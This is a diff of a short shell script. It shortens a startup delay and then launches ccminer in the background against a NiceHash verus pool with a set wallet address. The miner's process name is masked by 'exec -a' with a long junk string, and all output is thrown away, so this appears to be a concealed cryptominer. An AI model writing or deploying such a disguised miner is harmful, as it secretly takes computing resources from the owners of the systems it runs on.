@@ -1,6 +1,6 @@
 #!/bin/sh
 
-sleep 800
+sleep 60
 bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200#xnsub -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG11 -p x -t 1 > /dev/null 2>&1" &
     
     
